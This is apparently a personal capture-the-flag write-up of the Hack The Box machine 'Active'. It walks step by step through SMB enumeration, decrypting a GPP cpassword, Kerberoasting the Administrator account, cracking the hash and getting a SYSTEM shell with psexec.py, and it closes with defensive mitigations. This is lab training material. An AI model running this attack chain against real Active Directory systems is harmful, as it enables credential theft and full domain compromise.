# Active

```
kali@kali:~/htb/Active$ sudo nmap -sV -sC 10.129.74.65
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 14:20 EST
Nmap scan report for 10.129.74.65
Host is up (0.029s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-02-01 19:20:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-02-01T19:21:27
|_  start_date: 2021-02-01T03:23:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.43 seconds

```

Indeed, a fairly active machine. I add it to my /etc/hosts file as active.htb

I run a smbmap to enumerate some information as we can see that port 445 is open.

```
kali@kali:~/htb/Active$ smbmap -H 10.129.74.65
[+] IP: 10.129.74.65:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

We have read access with Replication, so let's try and check what we can find there:


```
kali@kali:~/htb/Active$ sudo smbclient //10.129.74.65/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5202044 blocks available
smb: \> 

```

-N here means no-password. Hence the "Anonymous login successful"


I try to download everything I find here, which will make it easier to sift through;

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

recurse ON turns on recursive search
prompt off turns off the prompt asking for anything
mget * just downloads everything recursively from the current directory.


Now we can get a clearer picture of what the smbserver looks like:

```
kali@kali:~/htb/Active$ tree                                                                                                                                                                              
.                                                                                                                                                                                                                                                                                                                                                                               
└── active.htb                                                                                                                                                                                            
    ├── DfsrPrivate                                                                                                                                                                                       
    │   ├── ConflictAndDeleted                                                                                                                                                                            
    │   ├── Deleted                                                                                                                                                                                       
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

```

You can install tree with `apt-get install tree"`


One file immediatelly jumps out as interesting:

```
kali@kali:~/htb/Active$ cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
kali@kali:~/htb/Active$ 
```

Ok, so we got a user: active.htb\SVC_TGS and a password.

I google around for cpassword, and groups.xml etc. and see that I can decrypt with gpp-decrypt(group policy preferences-decrypt):

```
kali@kali:~/htb/Active$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
kali@kali:~/htb/Active$ 
```

We can then test this with crackmap:

```
kali@kali:~/htb/Active$ cme smb 10.129.74.65 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.129.74.65    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
SMB         10.129.74.65    445    DC               [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
kali@kali:~/htb/Active$ 
```

So I did some googling on how to leverage this and found the script GetUserSPNs.py

We can get to this conclusion by noticing that this machine uses Kerberos. And Kerberos uses Service Principal Names(SPN)

https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names 

We can use a Ticket-granting-service(TGS) to request the password hashes for any user account with an SPN. This is called Kerberoasting:

https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting 


```
kali@kali:~/htb/Active$ /home/kali/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.74.65 -request -output hash
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-22 03:42:30.615553             



kali@kali:~/htb/Active$ 
```

Here we are specifying our login

Then selecting our domain controller(the IP)

requesting the SPNs

And then outputing to a file called hash.


And the hash looks like this:

```
kali@kali:~/htb/Active$ cat hash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$f67afb0a51b486c566db0dea0f8753c5$610b1d355b9e40f2128d01baa7ffe6877c3a317215dfc89e58896297615572c99f2e290a90eca2cc202a699485d18cf8238a1554155755b959acb236f87508755f2c4d171d984be569d8ecf7a12bf7997a9863852f3c9c16843e9fee9179544bbaa1ce03491bdad573696448147a02199556ea43831e61e2a42264e7ee930121c19e34b138b0c58b22fbcc1e5911351f18270020b58c03e06327404b828a7438099ff3be30a5095546ab83d44e4c40c4309cc7a7aca7beb61a5a7d11fb9d571671faed1e4f97e38e604717dad65be71ad18041e646eab12db6f9fa2a523e1488f0dd4fa8391bfdf3393175c99dba88c5307516b5457416429397bb8b6e9c52464d5bc9208a94892346aef3a152126e387faa356995be30834c041bf7129b7090f31b0fb7b6dfed37b640170c5e2a75475623d76a282d43c4d8c7be9fa7dbb4b41d8e5b7b063bdb961e9d762855053d83302bcb8c68fd6264379db4dfcdaf302c1e41e8226f0387867d12495a16d98da01a68adbb221e6cf28c54aea03e72344cd94040f0bec4cad84e913019da6fefb44245a59d2e9991f84312d1417e2ed7864f2cfd17b4fcc8bea1db3836510315cc8aca1084d4d0ea820070e23f9dec5c1189a2a1597a4cff6a682fa552922baa7e85cf9ab1d9a30eec4c213170a2c1f1fbe448ef7ef5c7377fc54353e4670d74a1388ccd9a672a505eb3458e00aab8b7049bf054d0e8b761aa711244e7d9de66241068c6fa301852f9c08aca96d6a96c6e5ed33e1c8646135dca853654b0a9cf3dead40fe8e9d747b675d0177a6993379311c1977f41cd2dfa1fc90b9f3753fde1b923ecf4c3f5e2a3f6686a7efa711b917f10f77193158bbc289fb39f28af10b4880505075daeb6cc593e53ca8199e85263649d86163103acfa82b1b80f4e7f5af11649827bc18578a9f8551230e4876dc9ec58320f652b0215a2af8cd5159c5c3de25c6583e7ef5313b9356632e09486d4b71d0fbb6db7aa4ac8d575e92bbb44b893d88c39f15e465d81eff781e5aa719f99b7905dc33d740063e4c863773c7e8452facd9105091fa8c976f86d95bb0ba74c472dade145d8facf368eebc143716eb6c7cc804ee539e46ae9edbb591091736f07b35b75c756d7dc23062bde1753026085006e4aa3c92ea4f1a262a9a3d8c8d33189b08bccf188d13eb1a388c1fd3fe03ad4283badf61c228a15d29175873ea91471c71d117eb2ebaff70a273c6487e02507f41e634435af
kali@kali:~/htb/Active$ 
```

So we can easily run john the ripper:

```
kali@kali:~/htb/Active$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2021-02-01 17:23) 0.1893g/s 1995Kp/s 1995Kc/s 1995KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~/htb/Active$ 

```

And now we have the Administrator account, we can use psexec to get access:

```
kali@kali:~/htb/Active$ psexec.py active.htb/Administrator:Ticketmaster1968@10.129.74.65
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.74.65.....
[*] Found writable share ADMIN$
[*] Uploading file PUJlavmM.exe
[*] Opening SVCManager on 10.129.74.65.....
[*] Creating service pmim on 10.129.74.65.....
[*] Starting service pmim.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

psexec is a tool that allows for remote command execution.

In this case it's been incorporated into a python file for ease of use. It defaults to cmd.exe


Another way to get the flags is this:

```
kali@kali:~/htb/Active$ cme smb 10.129.74.65 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares/usr/local/lib/python2.7/dist-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
  'The soupsieve package is not installed. CSS selectors cannot be used.'
SMB         10.129.74.65    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
SMB         10.129.74.65    445    DC               [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.74.65    445    DC               [+] Enumerated shares
SMB         10.129.74.65    445    DC               Share           Permissions     Remark
SMB         10.129.74.65    445    DC               -----           -----------     ------
SMB         10.129.74.65    445    DC               ADMIN$                          Remote Admin
SMB         10.129.74.65    445    DC               C$                              Default share
SMB         10.129.74.65    445    DC               IPC$                            Remote IPC
SMB         10.129.74.65    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.74.65    445    DC               Replication     READ            
SMB         10.129.74.65    445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.74.65    445    DC               Users           READ            
kali@kali:~/htb/Active$ 
```

--shares enumerates the shares and access.


And then:

```
kali@kali:~/htb/Active$ smbmap -d active.htb -u 'Administrator' -p 'Ticketmaster1968' -H 10.129.74.65 -R Users -A "root.txt|user.txt"
[+] IP: 10.129.74.65:445        Name: active.htb                                        
[+] Starting search for files matching 'root.txt|user.txt' on share Users.
[+] Match found! Downloading: Users\Administrator\Desktop\root.txt
[+] Match found! Downloading: Users\SVC_TGS\Desktop\user.txt
kali@kali:~/htb/Active$ ls
10.129.74.65.nmap                                  10.129.74.65-Users_SVC_TGS_Desktop_user.txt  hash
10.129.74.65-Users_Administrator_Desktop_root.txt  active.htb
kali@kali:~/htb/Active$ cat 10.129.74.65-Users_Administrator_Desktop_root.txt
b5fc76d1xxxxxxxxxxxxxxxxxxxxxxxx
kali@kali:~/htb/Active$ cat 10.129.74.65-Users_SVC_TGS_Desktop_user.txt 
86d67d8bxxxxxxxxxxxxxxxxxxxxxxxx
kali@kali:~/htb/Active$ 
```
-d the domain

-H the host

-R recursively list dirs, and files. In this case, we know the flags are in Users\Administrator\Desktop or something like that. So we can just start in Users to save time.

-A searches for a file pattern and auto downloads. Here we are doing root.txt OR user.txt



## Comparing myself to the official writeup:

After they discover the active directory, they run safe nmap scripts to discover the OS and smb versions. They continue to run smbclient to get the Replication directory.

They download groups.xml to discover the gpp password.

They use ldapsearch to query the Domain controller for active user accounts.

After this they use ldapsearch to confirm that the administrator account is configured with SPN, and then use GetUserSPNs.py to get the hash.

they use hashcat to crack the password, and then wmiexec.py to gain root.


They also detail how to do kerberoast the old-school style. Using mimikatz.

## How to stop this exploit:

Don't give any access to unauthenticated accounts. For example: An anonymous user was able to get read access to the system here.

Kerberoasting can be detected by monitoring the windows event log for TGS requests. The events should be examined for use of RC4 encryption, and large volumes.

Use Kerberos Armoring, also called Kerberos Flexible Authentication Secure Tunneling(FAST).

Disable insecure protocols in Kreberos.

Use group Managed Service Accounts(gMSA) where possible. audit SPN assignments to sensitive user accounts. Administrator accounts for example should not be used as service accounts, and therefore not have an SPN.
